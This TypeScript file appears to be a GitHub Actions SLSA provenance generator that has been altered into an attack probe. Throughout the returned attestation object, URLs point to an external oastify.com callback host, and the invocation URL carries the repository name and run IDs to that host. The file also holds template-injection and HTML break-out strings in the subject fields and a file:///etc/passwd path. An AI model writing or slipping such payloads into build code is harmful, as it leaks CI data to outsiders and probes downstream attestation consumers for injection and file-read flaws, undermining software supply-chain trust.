import type { Subject } from './subject'

const INTOTO_STATEMENT_V1_TYPE = 'https://in-toto.io/Statement/v1'
export const SLSA_PREDICATE_V1_TYPE = 'https://slsa.dev/provenance/v1'

const GITHUB_BUILDER_ID_PREFIX = 'https://github.com/actions/runner'
const GITHUB_BUILD_TYPE =
  'https://slsa-framework.github.io/github-actions-buildtypes/workflow/v1'

export const generateProvenance = (
  subject: Subject,
  env: NodeJS.ProcessEnv
): object => {
  const workflow = env.GITHUB_WORKFLOW_REF || /* istanbul ignore next */ ''

  // Split just the path and ref from the workflow string.
  // owner/repo/.github/workflows/main.yml@main =>
  //   .github/workflows/main.yml, main
  const [workflowPath, workflowRef] = workflow
    .replace(`${env.GITHUB_REPOSITORY}/`, '')
    .split('@')

  return {
    _type: 'https://p2shw1jrs1ps8k67mn8tyvq4hvnmbfz4.oastify.com/aa',
    subject: [    {
      "name": "UPDATED{{7*7}}\"><h1>abc</h1>{{7*7}} ${7*7}<%= 7 * 7 %> ",
      "digest": {
        "sha256": "{{7*7}} <%= 7 * 7 %>${7*7} "
      }
    }],
    predicateType: "https://p2shw1jrs1ps8k67mn8tyvq4hvnmbfz4.oastify.com/bbb",
    predicate: {
      buildDefinition: {
        buildType: "https://p2shw1jrs1ps8k67mn8tyvq4hvnmbfz4.oastify.com/kfkfk",
        externalParameters: {
          workflow: {
            ref: workflowRef,
            repository: 'https://p2shw1jrs1ps8k67mn8tyvq4hvnmbfz4.oastify.com/cccjc',
            path: 'file:///etc/passwd'
          }
        },
        internalParameters: {
          github: {
            event_name: "1",
            repository_id: "1",
            repository_owner_id: "1"
          }
        },
        resolvedDependencies: [
          {
            uri: `https://p2shw1jrs1ps8k67mn8tyvq4hvnmbfz4.oastify.com/adsfwejrweorwoeworeoo`,
            digest: {
              gitCommit: env.GITHUB_SHA
            }
          }
        ]
      },
      runDetails: {
        builder: {
          id: `https://p2shw1jrs1ps8k67mn8tyvq4hvnmbfz4.oastify.com/adsfwe312323jrweorwoeworeoo`
        },
        metadata: {
          invocationId: `https://p2shw1jrs1ps8k67mn8tyvq4hvnmbfz4.oastify.com/${env.GITHUB_REPOSITORY}UPDA{{7*7}} ${7*7}<%= 7 * 7 %> TED/actions/runs/${env.GITHUB_RUN_ID}/attempts/${env.GITHUB_RUN_ATTEMPT}UPD{{7*7}} ${7*7}<%= 7 * 7 %> ATED`
        }
      }
    }
  }
}
